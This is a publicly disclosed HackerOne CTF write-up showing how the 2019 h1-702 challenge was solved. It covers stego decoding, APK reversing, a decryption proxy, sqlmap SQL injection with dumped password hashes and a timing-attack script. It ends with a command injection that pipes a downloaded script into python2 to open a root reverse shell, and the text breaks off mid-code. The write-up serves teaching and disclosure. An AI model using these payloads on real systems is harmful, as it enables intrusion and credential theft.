{"id":509080,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MDkwODA=","url":"https://hackerone.com/reports/509080","title":"LFI on Accounting server and RCE on FliteThermostat admin server","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2019-03-13T05:38:26.951Z","submitted_at":"2019-03-13T05:38:26.951Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"stong","url":"/stong","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/308/492/483bbf842beb55bc2377d05e2085b606b3266dd4_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":38489,"url":"https://hackerone.com/50m-ctf","handle":"50m-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/038/489/ff893443bc2ef278fa8f0cdb64fb2f2322c8bcb7_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"50m-ctf","twitter_handle":null,"website":"https://hackerone.com/","about":null}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-04-08T15:56:21.938Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-04-08T15:56:14.541Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nAn attacker is able to download local files on the Accounting server due leveraging improper input sanitization in the Invoice PDF generator. In the same fashion an attacker is also able to issue server-side requests on the Accounting server through user-controlled CSS, possibly leading to further exploitation.\n\nAn attacker is able to execute remote code on the FliteThermostat admin control panel's server due to a command injection vulnerability. Said control panel's authentication can be broken using a timing attack. Lastly, an attacker is able to read the contents of the thermostat database due to a SQL injection vulnerability.\n\n## Steps To Reproduce:\nMany of my friends are deep into web security, but this is my first time really getting my toes wet :D\nI did well on h1-702-ctf last year, so I wanted to try it again this year!\nI will be detailing the process I took using a \"CTF-style\" writeup, which is probably more verbose than a usual bug-bounty writeups. Hopefully though, it will more clearly explain the thought process and intuition I followed. Plus, this is a \"CTF\" right?\n\n### (0x00) Baby Steps.\nI found out about this challenge from my friend Jazzy, who linked me [this tweet](https://twitter.com/Hacker0x01/status/1100543680383832065). To be honest, I actually didn't realize that the challenge began with the image embedded with the tweet until I did more recon and found [Cody Brocious's Twitter](https://twitter.com/daeken/status/1100634878490656768). Then it was clear that we were supposed to look for data hidden in the image.\n\nClearly there's some binary text in the background. The first thing I noticed was that the data was regular, because of the equal spacing between the underscores in the image. The text wrapping leads to the formation of a linear pattern artifact.\n\n{F440492}\n\nSince each chunk seems to be the same, thankfully we only need to transcribe one reptition of this pattern, not the whole image. Transcribing this, we get the data:\n\n```\n7A 6C 69 62 2B 78 9C CB 28 29 29 28 B6 D2 D7 4F  zlib+xœË())(¶Ò×O\nCA 2C D1 4B C9 D7 CF 30 2C C9 48 2D CA 05 00 5B  Ê,ÑKÉ×Ï0,ÉH-Ê..[\n4F 07 F4 7A 6C 69 62 2B 78 9C CB 28 29 29 28 B6  O.ôzlib+xœË())(¶\n```\n\nThe data announces that it's zlib compressed, but we can also tell from the `78 9C` magic at offset 5. We cut off the first five bytes and decompress:\n\n```\n$ echo \"78 9C CB 28 29 29 28 B6 D2 D7 4F CA 2C D1 4B C9 D7 CF 30 2C C9 48 2D CA 05 00 5B 4F 07 F4 7A 6C 69 62 2B 78 9C CB 28 29 29 28 B6\" | xxd -r -p | openssl zlib -d; echo\nhttps://bit.do/h1therm\n```\n\nCool! So we have a URL to work with now. I also looked for LSB stego, which is typical for this type of challenge.\n\n{F440489}\n\nThere is regular data in the LSB of the red, green, and blue planes. Extracting this, we see the same data as earlier.\n\n{F440490}\n\n### (0x01) h1therm\n\nThe url from earlier is a shortened URL which leads to a [grdive link](https://drive.google.com/file/d/1u5Mg1xKJMrW4DMGaWtBZ1TJKPdvqCWdJ/view) of an APK, h1thermostat.apk. Okay, so looks like we will need to do some managed-code reversing. APK's are essentially zip files, so let's take a peek inside.\n\n```\n$ unzip -l h1thermostat.apk\nArchive:  h1thermostat.apk\n  Length      Date    Time    Name\n---------  ---------- -----   ----\n     3188  1980-00-00 00:00   AndroidManifest.xml\n       87  1980-00-00 00:00   META-INF/MANIFEST.MF\n      ...\n  3012436  1980-00-00 00:00   classes.dex\n      ...\n    15132  1980-00-00 00:00   res/mipmap-xxxhdpi-v4/ic_launcher_round.png\n   333076  1980-00-00 00:00   resources.arsc\n---------                     -------\n  4835993                     568 files\n```\n\nLooks like we are dealing with a .dex file, which we will need to decompile to .class files to decompile.\nLuckily there is a good tool for this, dex2jar. \n\n```\n$ dex-tools-2.1-SNAPSHOT\\d2j-dex2jar.bat classes.dex\ndex2jar classes.dex -\u003e ./classes-dex2jar.jar\n$ jda classes-dex2jar.jar\n```\n\nNow let's analyze this binary. My preferred tool for Java reversing is JDA, which helpfully displays decompiled output side-by-side with Bytecode or an intermediate representation. Looking through a list of strings, we see `ttp://35.243.186.41/`, `username`, `password`, `cmd`, and `getTemp`. Judging from this, I bet we're dealing with a login API. So, let's just try POSTing to it and see what happens.\n\n```\n$ curl -X POST http://35.243.186.41/\nD7x4a8mJ/xcxoiH0vPNa6bhXAs/4rCXTORPrJK9wSPzD32NZRiZTgIWq0kjqQpLsUd87ao2/zlkoDu9PfAjs2g==\n$ curl -X POST http://35.243.186.41/ | base64 -d | xxd\n00000000: d2a9 88d7 ae25 4a73 2c5d d4af 36bf 2bc9  .....%Js,]..6.+.\n00000010: 8bdc 4e7f 539b cade d8e1 d18d 1e1b ccb4  ..N.S...........\n00000020: 5ef7 82ff 39b3 9ae4 d261 5a41 b09e 0ec8  ^...9....aZA....\n00000030: 5a1b 3fe4 368a 65c1 b3fe 4669 1092 1c36  Z.?.6.e...Fi...6\n```\n\nUmm...okay. This is high-entropy data. I guess we need to read the source code. The last four strings, `username`, `password`, `cmd`, and `getTemp`, are used in the clas LoginActivity, which simply builds a payload from the login form. The payload is a JSON object that looks like `{\"username\": \"admin\", \"password\": \"1234\", \"cmd\": \"getTemp\"}`. The PayloadRequest class actually performs the request, so we will analyze this class in greater detail.\n\n```java\npublic class PayloadRequest extends Request {\n    private final Listener mListener;\n    private final HashMap mParams;\n\n    public PayloadRequest(JSONObject var1, final Listener var2) throws Exception {\n        super(1, \"http://35.243.186.41/\", new ErrorListener() {\n            public void onErrorResponse(VolleyError var1) {\n                var2.onResponse(\"Connection failed\");\n            }\n        });\n        this.mListener = var2;\n        this.mParams = new HashMap();\n        this.mParams.put(\"d\", this.buildPayload(var1));\n    }\n\n    private String buildPayload(JSONObject var1) throws Exception {\n        SecretKeySpec var2 = new SecretKeySpec(new byte[]{56, 79, 46, 106, 26, 5, -27, 34, 59, -128, -23, 96, -96, -90, 80, 116}, \"AES\");\n        byte[] var3 = new byte[16];\n        (new SecureRandom()).nextBytes(var3);\n        IvParameterSpec var4 = new IvParameterSpec(var3);\n        Cipher var5 = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n        var5.init(1, var2, var4);\n        byte[] var6 = var5.doFinal(var1.toString().getBytes());\n        byte[] var7 = new byte[var6.length + 16];\n        System.arraycopy(var3, 0, var7, 0, 16);\n        System.arraycopy(var6, 0, var7, 16, var6.length);\n        return Base64.encodeToString(var7, 0);\n    }\n\n    protected Response parseNetworkResponse(NetworkResponse var1) {\n        try {\n            String var2 = new String(var1.data);\n            byte[] var3 = Base64.decode(var2, 0);\n            byte[] var9 = new byte[16];\n            System.arraycopy(var3, 0, var9, 0, 16);\n            byte[] var6 = new byte[var3.length - 16];\n            System.arraycopy(var3, 16, var6, 0, var3.length - 16);\n            SecretKeySpec var11 = new SecretKeySpec(new byte[]{56, 79, 46, 106, 26, 5, -27, 34, 59, -128, -23, 96, -96, -90, 80, 116}, \"AES\");\n            IvParameterSpec var4 = new IvParameterSpec(var9);\n            Cipher var10 = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n            var10.init(2, var11, var4);\n            var9 = var10.doFinal(var6);\n            String var7 = new String(var9);\n            JSONObject var12 = new JSONObject(var7);\n            if (var12.getBoolean(\"success\")) {\n                return Response.success((Object)null, this.getCacheEntry());\n            } else {\n                Response var8 = Response.success(var12.getString(\"error\"), this.getCacheEntry());\n                return var8;\n            }\n        } catch (Exception var5) {\n            return Response.success(\"Unknown\", this.getCacheEntry());\n        }\n    }\n}\n\n```\n\nJust as we expected, this class does cryptography with a hardcoded key on the request and response bodies. It encrypts the payload and encodes it as base64, passing it as the parameter `d`. Let's quickly implement this behavior into a transparent reverse proxy so we can actually access the endpoint and play with it (Twisted FTW).\n\n```python\nfrom twisted.internet import reactor\nfrom twisted.web import proxy, server\nfrom twisted.web.resource import EncodingResourceWrapper, Resource\nfrom io import BytesIO as StringIO\n\nfrom urllib import urlencode\nfrom base64 import b64decode, b64encode\nimport json\nfrom Crypto.Cipher import AES\n\n# https://stackoverflow.com/questions/12562021/aes-decryption-padding-with-pkcs5-python\nBS = 16\npad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS) \nunpad = lambda s : s[0:-ord(s[-1])]\n\nclass AESCipher:\n    def __init__( self, key ):\n        self.key = key.decode(\"hex\")\n\n    def encrypt( self, raw ):\n        raw = pad(raw)\n        iv = 'A' * 16\n        cipher = AES.new( self.key, AES.MODE_CBC, iv )\n        return iv + cipher.encrypt( raw )\n\n    def decrypt( self, enc ):\n        iv  = enc[:16]\n        enc = enc[16:]\n        cipher = AES.new(self.key, AES.MODE_CBC, iv )\n        return unpad(cipher.decrypt( enc))\n\nclass CryptEncoderFactory(object):\n    cipher = AESCipher('384f2e6a1a05e5223b80e960a0a65074')\n\n    def encoderForRequest(self, request):\n        payload = json.dumps({k:v[0] for k,v in request.args.items()})\n        print payload\n        encoded_payload = urlencode({'d': b64encode(self.cipher.encrypt(payload))})\n        print encoded_payload\n        request.content = StringIO(encoded_payload)\n        request.requestHeaders.removeHeader('content-length')\n        request.requestHeaders.setRawHeaders('content-length', [str(len(encoded_payload))])\n        return CryptEncoder(request, self.cipher)\n\nclass CryptEncoder(object):\n    def __init__(self, request, cipher):\n        self.request = request\n        self.cipher = cipher\n\n    def encode(self, data):\n        print data\n        try:\n            decrypted = self.cipher.decrypt(b64decode(data))\n            self.request.responseHeaders.removeHeader('content-length')\n            self.request.responseHeaders.setRawHeaders('content-length', [str(len(decrypted))])\n            print decrypted\n            return decrypted\n        except Exception as e:\n            print 'Failed to decrypt response:',e\n            return data\n\n    def finish(self):\n        return ''\n\nclass EncoderFactoryFactory(object):\n    def __init__(self, encoders):\n        self.encoders = encoders\n\n    def wrap(self, wrapped):\n        class CryptingReverseProxy(proxy.ReverseProxyResource, object):\n            def __init__(wrapped_self, backend):\n                super(CryptingReverseProxy, wrapped_self).__init__(backend.host, backend.port, backend.path, backend.reactor)\n            \n            def getChild(wrapped_self, path, request):\n                return self.wrap(super(CryptingReverseProxy, wrapped_self).getChild(path, request))\n\n        return EncodingResourceWrapper(CryptingReverseProxy(wrapped), self.encoders)\n\nbackend = proxy.ReverseProxyResource('35.243.186.41', 80, '')\nwrapper = EncoderFactoryFactory([CryptEncoderFactory()])\nsite = server.Site(wrapper.wrap(backend))\nreactor.listenTCP(8001, site)\nreactor.run()\n```\n\nThe implementation is not very clean, but it is very fast. Anyways let's test our endpoint!\n\n```\n$ curl \"http://localhost:8001\" -X POST --data \"username=admin\u0026password=lol123\u0026cmd=getTemp\"\n\"success\": false, \"error\": \"Invalid username or password\"}\n$ curl \"http://localhost:8001\" -X POST --data \"username=admin\u0026password=password\u0026cmd=getTemp\"\n{\"temperature\": 73, \"success\": true}\n$ curl \"http://localhost:8001\" -X POST --data \"username=admin\u0026password=password\u0026cmd=getTempp\"\n{\"success\": false, \"error\": \"Unknown command\"}\n$ curl \"http://localhost:8001\" -X POST --data \"username=admin\u0026password=password\u0026cmd=setTemp\"\n{\"success\": false, \"error\": \"Missing temperature\"}\n$ curl \"http://localhost:8001\" -X POST --data \"username=admin\u0026password=password\u0026cmd=setTemp\u0026temp=50\"\n{\"success\": true}\n```\n\nLOL nice password. Let's check for SQL injection.\n\n```\n$ python sqlmap.py -u \"http://localhost:8001\" --method=POST --data=\"username=admin\u0026password=admin\u0026cmd=setTemp\u0026temp=50\" --level 5 --risk 3\n        ___\n       __H__\n ___ ___[\"]_____ ___ ___  {1.3.2.31#dev}\n|_ -| . [']     | .'| . |\n|___|_  [']_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 23:24:00 /2019-03-12/\n\n[23:24:18] [INFO] POST parameter 'username' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable\n[23:24:40] [INFO] POST parameter 'username' appears to be 'MySQL \u003e= 5.0.12 AND time-based blind' injectable\n[23:24:19] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'\nit looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]\nPOST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N]\nsqlmap identified the following injection point(s) with a total of 772 HTTP(s) requests:\n---\nParameter: username (POST)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)\n    Payload: username=admin' AND 6107=(SELECT (CASE WHEN (6107=6107) THEN 6107 ELSE (SELECT 4219 UNION SELECT 9192) END))-- ZaDb\u0026password=admin\u0026cmd=setTemp\u0026temp=50\n\n    Type: AND/OR time-based blind\n    Title: MySQL \u003e= 5.0.12 AND time-based blind\n    Payload: username=admin' AND SLEEP(5)-- rYre\u0026password=admin\u0026cmd=setTemp\u0026temp=50\n---\n[23:25:11] [INFO] the back-end DBMS is MySQL\nweb application technology: Nginx 1.15.8\nback-end DBMS: MySQL \u003e= 5.0.12\n[23:25:11] [INFO] fetched data logged to text files under '/root/.sqlmap/output/localhost'\n\n[*] ending @ 23:25:11 /2019-03-12/\n```\n\nNice. Let's dump everything!\n\n```\n$ python sqlmap.py -u \"http://localhost:8001\" --method=POST --data=\"username=admin\u0026password=admin\u0026cmd=setTemp\u0026temp=50\" --dump --threads 5\nDatabase: flitebackend\nTable: users\n[2 entries]\n+----+----------+---------------------------------------------+\n| id | username | password                                    |\n+----+----------+---------------------------------------------+\n| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |\n| 2  | sevenate | c5b1d550b588178c4bb321069fb688ab (nine10)   |\n+----+----------+---------------------------------------------+\n\nDatabase: flitebackend\nTable: devices\n[151 entries]\n+-----+-----------------+\n| id  | ip              |\n+-----+-----------------+\n| 1   | 251.11.33.68    |\n| 2   | 10.143.156.45   |\n       --- snip ---\n| 150 | 192.88.99.145   |\n| 151 | 192.88.99.104   |\n+-----+-----------------+\n```\n\nNotice the weak hashes. We also see a table `devices` which apparently is just a list of IP addresses.\nHowever, looking at the list the majority of them seem to be either in private ranges or not routed.\nTo clean up this list, I used a nmap ping scan.\n\n```\n$ stdbuf -oL nmap -sn -vvv -iL hosts.txt | tee scan.txt\nStarting Nmap 7.40 ( https://nmap.org ) at 2019-03-17 10:38 EST\nInitiating Ping Scan at 20:08\nScanning 104.196.12.98 [4 ports]\nCompleted Ping Scan at 20:08, 0.22s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 20:08\nCompleted Parallel DNS resolution of 1 host. at 20:08, 0.02s elapsed\nDNS resolution of 1 IPs took 0.02s. Mode: Async [#: 2, OK: 1, NX: 0, DR: 0, SF: 0, TR: 1, CN: 0]\nInitiating SYN Stealth Scan at 20:08\nScanning 98.12.196.104.bc.googleusercontent.com (104.196.12.98) [1 port]\nDiscovered open port 80/tcp on 104.196.12.98\nCompleted SYN Stealth Scan at 20:08, 0.22s elapsed (1 total ports)\nNmap scan report for 98.12.196.104.bc.googleusercontent.com (104.196.12.98)\nHost is up, received reset ttl 55 (0.038s latency).\nScanned at 2019-03-17 10:38:23 EST for 1s\nPORT   STATE SERVICE REASON\n80/tcp open  http    syn-ack ttl 55\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 0.57 seconds\n           Raw packets sent: 5 (196B) | Rcvd: 7 (542B)\n```\n\nReally? Only 1 host is up, and it has http server? This must be the path forwards.\n\n### (0x02) FliteThermostat, part I\n\nWe are first greeted by what appears to be a login page.\n\n{F440494}\n\nLooking at the webpage's source code, we see the bulk of the functionality is implemented in `login.js`:\n\n```javascript\nfunction stream(key) {\n\tthis.b = [];\n\tfor(var i = 0; i \u003c 256; ++i)\n\t\tthis.b[i] = i;\n\tvar j = 0;\n\tfor(var i = 0; i \u003c 256; ++i) {\n\t\tj = (j + this.b[i] + key.charCodeAt(i % key.length)) \u0026 0xFF;\n\t\tvar t = this.b[i];\n\t\tthis.b[i] = this.b[j];\n\t\tthis.b[j] = t;\n\t}\n\tthis.a = 0;\n\tthis.c = 0;\n}\n\nstream.prototype.next = function() {\n\tthis.a = (this.a + 1) \u0026 0xFF;\n\tthis.c = (this.c + this.b[this.a]) \u0026 0xFF;\n\tvar t = this.b[this.a];\n\tthis.b[this.a] = this.b[this.c];\n\tthis.b[this.c] = t;\n\treturn this.b[(this.b[this.a] + this.b[this.c]) \u0026 0xFF];\n};\n\nfunction e(x) {\n\tvar s = new stream(x);\n\tvar ox = '';\n\tfor(var i = 0; i \u003c x.length; ++i)\n\t\tox += String.fromCharCode(s.next() ^ x.charCodeAt(i));\n\treturn ox;\n}\n\nfunction hash(x) {\n\tx += '\\x01\\x00';\n\twhile((x.length \u0026 0xFF) != 0)\n\t\tx += String.fromCharCode((x.length \u0026 0xFF) ^ x.charCodeAt[x.length \u0026 0xFF]);\n\t\n\tvar h = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];\n\tfor(var i = 0; i \u003c x.length; i += 32) {\n\t\tvar c = e(x.substring(i, i + 32));\n\t\tfor(var j = 0; j \u003c 32; ++j)\n\t\t\th[j] ^= c.charCodeAt(j);\n\t}\n\n\tvar hs = '';\n\tfor(var i = 0; i \u003c 32; ++i)\n\t\ths += String.fromCharCode(h[i]);\n\treturn hs;\n}\n\nfunction fhash(x) {\n\tfor(var i = 0; i \u003c 256; ++i)\n\t\tx = hash(x);\n\tvar h = '';\n\tfor(var i = 0; i \u003c 32; ++i) {\n\t\tvar t = x.charCodeAt(i).toString(16);\n\t\tif(t.length == 1)\n\t\t\tt = '0' + t;\n\t\th += t;\n\t}\n\treturn h;\n}\n\nfunction login() {\n\tdocument.getElementById('hash').value = fhash(\n\t\tdocument.getElementById('username').value +\n\t\t'\\x05\\0\\x06' + \n\t\tdocument.getElementById('password').value\n\t);\n\tdocument.getElementById('form').submit();\n}\n```\n\nThis is a crappy hash function based on multiple rounds of the RC4 stream cipher, where the key is the input data. However, I could not find any obvious flaws that while playing with this function. Instead, let's play with the server and see if we can do anything interesting.\n\nAs before, I implemented another reverse proxy; however, this proved to not be useful as Sqlmap didn't find any vulnerabilities. Plus, why would there be 2 SQLi challenges in a row? Taking a step back, one particular thing that bothered me was that we were authenticating using a hash, rather than username and password credentials. Why bother sending a hash? And if it's only hashed client-side, that defeats the purpose of hashing anyways, since if the hashes are ever stolen, you can break into people's accounts.\n\nHere is the intuition I had: First, assume the application is exploitable. If the problem isn't SQLi, and it isn't cryptographic, then there must be some kind of logical weakness in the server's app. **IDEALLY, what would the server's code look like?** In my head, I pictured some pseudocode like this:\n\n```\nif hardcoded_hash == request.get_param('hash'):\n\tauthenticate()\nelse:\n\tfail()\n```\n\nIn that case, the weakness must lie in the comparison itself. Otherwise, the solution to this challenge would have to be something other than a vulnerability in the webapp's programming. First, I thought of the PHP type juggling comparison bug, where strings starting with \"0e\" would be coerced to floats, and lead to faulty comparisons. But checking the 404 page quickly dispelled that idea.\n\n{F440488}\n\nThis doesn't look like PHP. This looks like Flask. OK, then. How else could the comparison be weak? Can we leak information about the hardcoded_hash? I was out of any other ideas, so I tried doing a timing attack on the string comparison. This almost never works, but hey, it's a CTF right? :)\n\n```python\nfrom scipy import stats\nimport numpy\nimport socket,time\nimport random\nimport threading\n\ndef do_request(q_hash):\n\tassert len(q_hash) == 64\n\trequest_data = \"\"\"POST / HTTP/1.1\nHost: 104.196.12.98\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 69\n\nhash=\"\"\" + q_hash + '\\n'\n\t\n\ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ts.connect((\"104.196.12.98\", 80))\n\tstart_time = time.time()\n\ts.send(request_data)\n\tresp = s.recv(1)\n\telapsed = time.time() - start_time\n\ts.shutdown(socket.SHUT_RDWR)\n\ts.close()\n\treturn elapsed\n\ndef generate_hash(prefix, val):\n\tq_hash = prefix + ('%02x' % val)\n\tq_hash += '00' * (32-len(q_hash)/2)\n\treturn q_hash\n\ndef do_sample(prefix, values):\n\tsample = []\n\tfor val in values:\n\t\ttime.sleep(0.1)\n\t\tq_hash = generate_hash(prefix, val)\n\t\telapsed = do_request(q_hash)\n\t\tsample.append(elapsed)\n\t\tprint q_hash, elapsed\n\t\t# if numpy.var(sample) \u003e 0.001:\n\t\t# \tprint 'This sample is garbage'\n\t\t# \tbreak\n\treturn sample\n\ndef stable_sample(prefix, values):\n\twhile True:\n\t\tsample = do_sample(prefix, values)\n\t\tmean = numpy.mean(sample)\n\t\tvar = numpy.var(sample)\n\t\tprint 'mu, sigma: ', mean, var\n\t\tif var \u003e 0.001:\n\t\t\tprint 'Sample variance too high. Try again.'\n\t\telse:\n\t\t\treturn sample\n\nnum_threads = 0\n\ndef test_val(pop_mean, prefix, val, cands):\n\tglobal num_threads\n\tprint '[*] Testing %02x' % (val,)\n\t# sample = stable_sample(prefix, [val] * 1)\n\tsample = do_sample(prefix, [val])[0]\n\tif sample - pop_mean \u003c 0.4:\n\t\tprint '[-] Boring (mean close to population)'\n\t\tprint\n\telse:\n\t\t# t, p = stats.ttest_ind(pop_sample, sample)\n\t\t# print 'p =', p\n\t\t# if p \u003c 0.001:\n\t\tprint '[+] This is a candidate!'\n\t\tcands.append(val)\n\t\t# else:\n\t\t\t# print '[-] Boring'\n\tnum_threads -= 1\n\ndef do_round(prefix, to_test):\n\tglobal num_threads\n\t# print '[*] Collecting a population sample'\n\t# pop_sample = stable_sample(prefix, [random.randint(0,255) for i in range(2)])\n\tpop_mean = 0.5 + len(prefix) / 4.0\n\tprint 'Expecting delay of %f seconds' % (pop_mean)\n\tprint\n\tcands = []\n\tfor val in to_test:\n\t\twhile num_threads \u003e= 20:\n\t\t\ttime.sleep(0.1)\n\t\tnew_thread = threading.Thread(target=test_val, args=(pop_mean, prefix, val, cands))\n\t\tnew_thread.daemon = True\n\t\tnew_thread.start()\n\t\tnum_threads += 1\n\t\tprint\n\t\ttime.sleep(1)\n\twhile num_threads \u003e 0:\n\t\ttime.sleep(0.1)\n\tprint '[*] Candidates:', cands\n\treturn cands\n\ndef hack():\n\tprefix = 'f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde7'\n\twhile len(prefix) \u003c 64:\n\t\tprint '[*] Round start:', prefix\n\t\tcands = range(0x00, 0xff)\n\t\twhile len(cands) \u003e 1:\n\t\t\tcands = do_round(prefix, cands)\n\t\t\tif not cands:\n\t\t\t\tprint 'Ran out of candidates!!'\n\t\t\t\treturn\n\t\tprefix += '%02x' % (cands[0],)\n\treturn prefix\n\nprint 'Result: ' + hack()\n\n# print ('%02x' % val), sum(samples)/len(samples), samples\n```\n\nIt's pretty obvious that the timing attack worked after I went through all the hashes from '00XXXXX...' to 'FFXXXXX...'. Any hash starting with 'f9' was noticably slower; the response time was delayed by about 0.5 seconds. Then I tried it for 'f900XXXX...' to 'f9FFXXXX', and 'f986' was delayed by about 1.0 seconds. I guess we are lucky that the remote server is very consistent with its delays. Unfortunately, the server's connection is really unstable so we often need multiple tries to make sure that we are sure whether a guess is correct or not.\n\nAfter a looooooooooooooooooooong time, we finally get the hash `f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8`, which we are able to log in with! It's kind of like a pass the hash attack, as we don't even need the plaintext credentials.\n\n### 0x03 FliteThermostat, part II\n\nI used Burp Suite to make the login request, then copied the cookies into Firefox. Now this screen greets us:\n\n{F440486}\n\nThe temperature control page wasn't really interesting. One interesting thing I noticed was that it only accepted valid numbers for its API parameter. But you could also use underscores in numbers (e.g. `12_345 = 12345`) which indicated that this was a Python3 Flask server.\n\nWhat piqued my interest was the Check For Updates page. If we could subvert the firmware update, we could get RCE then!\n\n{F440487}\n\nLet's see if we can control the host and port for this connection.\n\n```\nGET /update?port=1234\nConnecting to http://update.flitethermostat:1234/ and downloading update manifest\n```\n\nNice, that one was an easy guess. I tried playing with this parameter, but unfortunately it has to be a valid integer. :( The following parameter, on the other hand, was NOT an easy guess.\n\n```\nGET /update?port=1234\u0026update_host=perfect.blue\nConnecting to http://perfect.blue:1234/ and downloading update manifest\n```\n\nThis told me that this update checker doesn't actually work: I setup `nc -lvp 1234` on that host, but I didn't receive a connection. In that case, what could we do?\n\nUnlike before, this parameter isn't validated. So let's just try injecting some symbols to see if anything breaks.\n\n```\nGET /update?port=1234\u0026update_host=lol~!@#$%^\u0026*()_+-=[]\\{}|:%22;'%3C%3E?,./\nConnecting to http://lol~!@:1234/ and downloading update manifest\n```\n\nOK, looks like it cut off the input at `#`. I wonder if this is command injection?\n\n```\n/update?port=1234\u0026update_host=lol;echo a\nConnecting to http://lol and downloading update manifest\n...\n...\n...\nCould not connect\na:1234/\n```\n\n```\n/update?port=1234\u0026update_host=lol$PATH\nConnecting to http://lol/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:1234/ and downloading update manifest\n...\n...\n...\nCould not connect\n```\n\nYup...so my hypothesis is that the server probably does something like `exec(\"check_update http://\" + host \":\" + str(port)\")`. Let's upgrade this to a reverse shell and pop this box!\n\n```\nGET /update?port=12345\u0026update_host=x;curl%20https://raw.githubusercontent.com/perfectblue/attack-defense-tools/master/chippyshell.py%20|%20python2;echo%20\n\nOn server:\nroot@perfect.blue:~# socat file:`tty`,raw,echo=0 tcp-listen:6969\n  @@@@@@@ @@@  @@@ @@@ @@@@@@@  @@@@@@@  @@@ @@@  @@@ @@@@@@  @@@@@@  @@@@@@@\n !@@      @@!  @@@ @@! @@!  @@@ @@!  @@@ @@! !@@  @@@     @@!     @@!      @@!\n !@!      @!@!@!@! !!@ @!@@!@!  @!@@!@!   !@!@!   !@!  @!!!:   @!!!:      @!!\n :!!      !!:  !!! !!: !!:      !!:        !!:    !!!     !!:     !!:  .!!:\n  :: :: :  :   : : :    :        :         .:     :   ::: ::  ::: ::  : :\n             ~[  P R I V 8  C O N N E C T   B A C K   S H E L L  ]~\nLinux 834f8ab4b851 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux\nuid=0(root) gid=0(root) groups=0(root)\nroot@d090cd50ec64:~# ip addr\n1: lo: \u003cLOOPBACK,UP,LOWER_UP\u003e mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n170: eth0@if171: \u003cBROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc noqueue state UP group default \n    link/ether 02:42:ac:19:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0\n    inet 172.25.0.3/16 brd 172.25.255.255 scope global eth0\n       valid_lft forever preferred_lft forever\nroot@d090cd50ec64:~# df -h /\b\nFilesystem      Size  Used Avail Use% Mounted on\noverlay         9.8G  3.2G  6.1G  35% /\ntmpfs            64M     0   64M   0% /dev\ntmpfs           7.4G     0  7.4G   0% /sys/fs/cgroup\n/dev/sda1       9.8G  3.2G  6.1G  35% /etc/hosts\nshm              64M     0   64M   0% /dev/shm\ntmpfs           7.4G     0  7.4G   0% /proc/acpi\ntmpfs           7.4G     0  7.4G   0% /sys/firmware\nroot@d090cd50ec64:~# ls\nDockerfile   login.js  requirements.txt  temptarget  uwsgi.ini\n__pycache__  main.py   templates\t update.sh\n```\n\nNice. A few things to note: based on `ip addr`, we're probably inside Docker. Also, that \"\"\"update checker\"\"\" was a total scam:\n\n```bash\n#!/bin/bash\n\necho \"Connecting to $* and downloading update manifest\"\necho \"...\"\necho \"...\"\necho \"...\"\necho \"Could not connect\"\n```\n\nAnd the earlier hypothesis about the timing attack was pretty close!\n\n```python\nvalidLogin = 'f9865a4952a4f5d74b43f3558fed6a0225c6877fba60a250bcbde753f5db13d8'\n\n@app.route('/', methods=['GET', 'POST'])\ndef index():\n\tif 'loggedIn' in session and session['loggedIn']:\n\t\treturn redirect('/main')\n\terror = False\n\tif request.method == 